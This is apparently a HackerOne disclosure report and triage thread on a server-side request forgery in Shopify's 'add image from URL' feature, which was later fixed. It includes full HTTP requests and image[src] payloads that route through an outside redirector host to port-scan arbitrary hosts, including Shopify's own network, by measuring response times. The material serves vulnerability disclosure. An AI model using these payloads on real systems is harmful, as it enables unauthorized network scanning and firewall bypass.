title: SSRF via 'Add Image from URL' feature

profile.name: Shopify
profile.about: Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between.

vulnerability_information:
Hi Security team,

It is possible to add image from URL for products. To do this the folowing request is used:

```
POST /admin/products/922460995/images HTTP/1.1
Host: test-4925.myshopify.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
Accept: text/html, application/xhtml+xml, application/xml
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-XHR-Referer: https://test-4925.myshopify.com/admin/products/922460995
X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=
Referer: https://test-4925.myshopify.com/admin/products/922460995
Content-Length: 188
Cookie: COOKIES

utf8=%E2%9C%93&authenticity_token=F7cvLpquxqr%2BrFmnGVFhNEK6rV8njtebHikevxGlLJA%3D&product_id=922460995&image%5Bsrc%5D=IMAGE_URL&_method=post
```
This scenario can be abused via SSRF attack and it allows as minimum to scan arbitrary ports from Shopify hosts (e.g. 23.227.55.109).  Despite that URLs are validated it is possible to use a redirect trick to force to connect to any port. For example, to scan ftp port the following request may be send:

```
POST /admin/products/922460995/images HTTP/1.1
Host: test-4925.myshopify.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
Accept: text/html, application/xhtml+xml, application/xml
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-XHR-Referer: https://test-4925.myshopify.com/admin/products/922460995
X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=
Referer: https://test-4925.myshopify.com/admin/products/922460995
Content-Length: 188
Cookie: COOKIES

utf8=%E2%9C%93&authenticity_token=F7cvLpquxqr%2BrFmnGVFhNEK6rV8njtebHikevxGlLJA%3D&product_id=922460995&image%5Bsrc%5D=http%3A%2F%2Fhettoteam.tk/r.php?r=http://hettoteam.tk:21&_method=post
```
Then using HTTP RTT it is possible to know arbitrary port's status.
The network dump is in attachment.

Cheers,
Denis.
vulnerability_information_html:
Hi Security team,

It is possible to add image from URL for products. To do this the folowing request is used:

POST /admin/products/922460995/images HTTP/1.1
Host: test-4925.myshopify.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
Accept: text/html, application/xhtml+xml, application/xml
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-XHR-Referer: https://test-4925.myshopify.com/admin/products/922460995
X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=
Referer: https://test-4925.myshopify.com/admin/products/922460995
Content-Length: 188
Cookie: COOKIES

utf8=%E2%9C%93&authenticity_token=F7cvLpquxqr%2BrFmnGVFhNEK6rV8njtebHikevxGlLJA%3D&product_id=922460995&image%5Bsrc%5D=IMAGE_URL&_method=post

This scenario can be abused via SSRF attack and it allows as minimum to scan arbitrary ports from Shopify hosts (e.g. 23.227.55.109). Despite that URLs are validated it is possible to use a redirect trick to force to connect to any port. For example, to scan ftp port the following request may be send:

POST /admin/products/922460995/images HTTP/1.1
Host: test-4925.myshopify.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
Accept: text/html, application/xhtml+xml, application/xml
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-XHR-Referer: https://test-4925.myshopify.com/admin/products/922460995
X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=
Referer: https://test-4925.myshopify.com/admin/products/922460995
Content-Length: 188
Cookie: COOKIES

utf8=%E2%9C%93&authenticity_token=F7cvLpquxqr%2BrFmnGVFhNEK6rV8njtebHikevxGlLJA%3D&product_id=922460995&image%5Bsrc%5D=http%3A%2F%2Fhettoteam.tk/r.php?r=http://hettoteam.tk:21&_method=post

Then using HTTP RTT it is possible to know arbitrary port's status.
The network dump is in attachment.

Cheers,
Denis.

activities.message:
Example  of scanning ports for `scanme.nmap.org` host (TCP ports 1, 2, 3  - are closed, TCP port 22 - is opened).
`image[src]=http://hettoteam.tk/r.php?r=http://scanme.nmap.org:1` average RTT is about 300 ms
`image[src]=http://hettoteam.tk/r.php?r=http://scanme.nmap.org:22` average RTT is about 420 ms
activities.markdown_message:
Example of scanning ports for scanme.nmap.org host (TCP ports 1, 2, 3 - are closed, TCP port 22 - is opened).
image[src]=http://hettoteam.tk/r.php?r=http://scanme.nmap.org:1 average RTT is about 300 ms
image[src]=http://hettoteam.tk/r.php?r=http://scanme.nmap.org:22 average RTT is about 420 ms

activities.message: This feature is meant to connect to arbitrary hosts. We don't consider scanning the internet a security issue with Shopify.
activities.markdown_message: This feature is meant to connect to arbitrary hosts. We don't consider scanning the internet a security issue with Shopify.

activities.message:
Hello. Could you please look at https://cwe.mitre.org/data/definitions/918.html resource? Using your feature it is possible to connect to arbitrary ports of any host including internal networks, bypassing ACL of firewalls and routers.
Even if you think that this is a not vulnerability I do not understand why it has been marked as N/A? I described the issue correctly and I did not violate your Bug Bounty program's rules. If security team accepts a risk and does not want to fix issue a bug usually is marked as WONTFIX.
activities.markdown_message:
Hello. Could you please look at https://cwe.mitre.org/data/definitions/918.html resource? Using your feature it is possible to connect to arbitrary ports of any host including internal networks, bypassing ACL of firewalls and routers.
Even if you think that this is a not vulnerability I do not understand why it has been marked as N/A? I described the issue correctly and I did not violate your Bug Bounty program's rules. If security team accepts a risk and does not want to fix issue a bug usually is marked as WONTFIX.

activities.message:
Here protocol is also not filtered on the redirection, ports and external IP addresses are not filtered. I have reproduced the same behaviour as in the [bug 68389] (https://hackerone.com/reports/67389).
I used your host 23.227.55.1 and determined that port 22 is opened, and, for example, port 21 is closed based on timing (RTT) values.
activities.markdown_message:
Here protocol is also not filtered on the redirection, ports and external IP addresses are not filtered. I have reproduced the same behaviour as in the bug 68389.
I used your host 23.227.55.1 and determined that port 22 is opened, and, for example, port 21 is closed based on timing (RTT) values.

activities.message:
Hello Francois,

Could you please triage this bug or marke it as Duplicate of my another [SSRF bug] (https://hackerone.com/reports/67389). As I understand this bug can be marked as Duplicate if you are going to fix described SSRF using ACL on network layer and this bug should be triaged if you are going to fix SSRF in code, since here the same issues are reproduced.
Thanks.
activities.markdown_message:
Hello Francois,

Could you please triage this bug or marke it as Duplicate of my another SSRF bug. As I understand this bug can be marked as Duplicate if you are going to fix described SSRF using ACL on network layer and this bug should be triaged if you are going to fix SSRF in code, since here the same issues are reproduced.
Thanks.

activities.message: I'm going to mark this as duplicate, but please note that generally reporting duplicates of your own bugs is very frowned upon.
activities.markdown_message: I'm going to mark this as duplicate, but please note that generally reporting duplicates of your own bugs is very frowned upon.

activities.message: After verification, this bug is separate from your other bug #67389. Very sorry about that, I had originally thought that both places used the same upload logic, which turns out not to be the case. So I deployed a fix for this issue, but not the other issue.
activities.markdown_message: After verification, this bug is separate from your other bug #67389. Very sorry about that, I had originally thought that both places used the same upload logic, which turns out not to be the case. So I deployed a fix for this issue, but not the other issue.

activities.message: I have verified the bug. Unable to reproduce it.
activities.markdown_message: I have verified the bug. Unable to reproduce it.

activities.message: Hello. Is there any update for this report? I believe it was resolved. Thanks.
activities.markdown_message: Hello. Is there any update for this report? I believe it was resolved. Thanks.

activities.message: Hello. Any news regarding the issue?

Hello @alpha,

Sorry for the long wait time, this issue is still being processed. We'll get back to you soon.
activities.markdown_message:
Hello @alpha,

Sorry for the long wait time, this issue is still being processed. We'll get back to you soon.

activities.message: Hey there. Sorry for the delay, and thanks a lot for helping improve the security of Shopify. As you noted, this issue has been resolved.
activities.markdown_message: Hey there. Sorry for the delay, and thanks a lot for helping improve the security of Shopify. As you noted, this issue has been resolved.

summaries.content: Adding of images from URL can be used to perform [SSRF/XSPA](https://cwe.mitre.org/data/definitions/918.html) attacks. For example, it is possible to scan arbitrary Internet hosts and external Shopify's network protected by firewall.
summaries.content_html: Adding of images from URL can be used to perform SSRF/XSPA attacks. For example, it is possible to scan arbitrary Internet hosts and external Shopify's network protected by firewall.
